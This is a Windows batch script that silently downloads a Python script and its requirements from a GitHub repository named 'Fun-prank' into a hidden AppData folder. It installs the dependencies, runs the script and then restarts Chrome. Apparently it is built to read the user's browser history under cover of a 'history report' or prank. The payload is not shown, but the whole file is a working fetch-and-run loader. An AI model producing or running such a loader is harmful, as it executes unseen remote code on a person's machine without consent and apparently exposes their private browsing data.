@echo off
echo Starting process...

:: Create a log file to track the steps
set LOG_FILE=%APPDATA%\history\install_log.txt
echo %DATE% %TIME% - Process started. > %LOG_FILE%

:: Ensure the history directory exists
echo %DATE% %TIME% - Creating history directory if it doesn't exist. >> %LOG_FILE%
mkdir "%APPDATA%\history"

:: Download the history_report.py script from a URL
echo %DATE% %TIME% - Downloading history_report.py... >> %LOG_FILE%
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/main/history_report.py' -OutFile '%APPDATA%\history\history_report.py'"

:: Check if the file exists after downloading
if exist "%APPDATA%\history\history_report.py" (
    echo %DATE% %TIME% - File downloaded successfully. >> %LOG_FILE%
) else (
    echo %DATE% %TIME% - Failed to download history_report.py. Exiting... >> %LOG_FILE%
    pause
    exit /b
)

:: Download the requirements.txt file
echo %DATE% %TIME% - Downloading requirements.txt... >> %LOG_FILE%
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/main/requirements.txt' -OutFile '%APPDATA%\history\requirements.txt'"

:: Check if the requirements.txt file exists
if exist "%APPDATA%\history\requirements.txt" (
    echo %DATE% %TIME% - Requirements file downloaded successfully. >> %LOG_FILE%
) else (
    echo %DATE% %TIME% - Failed to download requirements.txt. Exiting... >> %LOG_FILE%
    pause
    exit /b
)

:: Install required Python libraries
echo %DATE% %TIME% - Installing required libraries... >> %LOG_FILE%
pip install -r "%APPDATA%\history\requirements.txt"

:: Check if pip installation was successful
if %ERRORLEVEL% NEQ 0 (
    echo %DATE% %TIME% - Failed to install required libraries. Exiting... >> %LOG_FILE%
    pause
    exit /b
)

:: Run the Python script
echo %DATE% %TIME% - Running the Python script... >> %LOG_FILE%
python "%APPDATA%\history\history_report.py"

:: Check if the script ran successfully
if %ERRORLEVEL% NEQ 0 (
    echo %DATE% %TIME% - Failed to run the Python script. Exiting... >> %LOG_FILE%
    pause
    exit /b
)

:: Wait for 3 seconds
echo %DATE% %TIME% - Waiting for 3 seconds... >> %LOG_FILE%
timeout /t 3

:: Reopen Google Chrome
echo %DATE% %TIME% - Reopening Google Chrome... >> %LOG_FILE%
start chrome

:: Log completion and pause
echo %DATE% %TIME% - Process completed. >> %LOG_FILE%
pause
